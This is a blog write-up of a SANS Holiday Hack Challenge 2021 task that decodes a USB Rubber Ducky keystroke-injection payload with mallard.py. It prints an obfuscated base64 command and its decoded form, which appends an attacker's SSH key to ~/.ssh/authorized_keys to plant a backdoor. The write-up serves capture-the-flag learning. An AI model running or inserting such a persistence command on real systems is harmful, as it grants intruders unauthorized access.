---
layout: post
title:  "5 - Strange USB Device"
date:   2021-12-13 02:00:39 -0800
categories: kringlecon2021 objective5 main
---

This is challenge number 5 in the 2021 SANS Holiday Hack Challenge (https://2021.kringlecon.com/). Objective:

>Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.

We start by logging onto the terminal on the Talks floor. We see that we need to find the username of the troll involved with this attack, and it tells us that the strange USB device has been mounted at /mnt/USBDEVICE

![Objective5 terminal](/assets/kringlecon2021/objective5/objective5_terminal.jpg)


If we take a peek of the inject.bin, we find a bunch of unreadable binary characters


![Objective5 injectbin](/assets/kringlecon2021/objective5/objective5_injectbin.jpg)


We also find a reference to a file called mallard.py. If we do a google search for this script we learn that this is a Ducky script decoder (https://github.com/dagonis/Mallard). So what is Ducky? Further research leads us to determine that (https://docs.hak5.org/hc/en-us/categories/360000982554-USB-Rubber-Ducky)

>Ducky is a keystroke injection tool disguised as a generic flash drive. Computers recognize it as a regular keyboard and automatically accept its pre-programmed keystroke payloads at over 1000 words per minute.

So putting 2 and 2 together, the inject.bin must be a ducky script, and they want us to decode that script using mallard.py. Let's do that!


{% highlight shell %}
python3 mallard.py -f /mnt/USBDEVICE/inject.bin
{% endhighlight %}


![Objective5 mallardoutput](/assets/kringlecon2021/objective5/objective5_mallardoutput.jpg)

We find this produces a readable set of instructions that have been encoded on the USB. None of the lines point to anything that tell us what the username of the troll may be, but we can observe a base64 encoded string that gets echo'd in the script. If we decode that:

{% highlight shell %}
88665a561824:Downloads bryan$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d

echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
{% endhighlight %}

Ah-hah! Here we find that the USB device was adding a backdoor SSH account for user ickymcgoop@trollfun.jackfrosttower.com. We now have our answer!


![Objective5 answer](/assets/kringlecon2021/objective5/objective5_answer.jpg)

![Objective5 complete](/assets/kringlecon2021/objective5/objective5_complete.jpg)
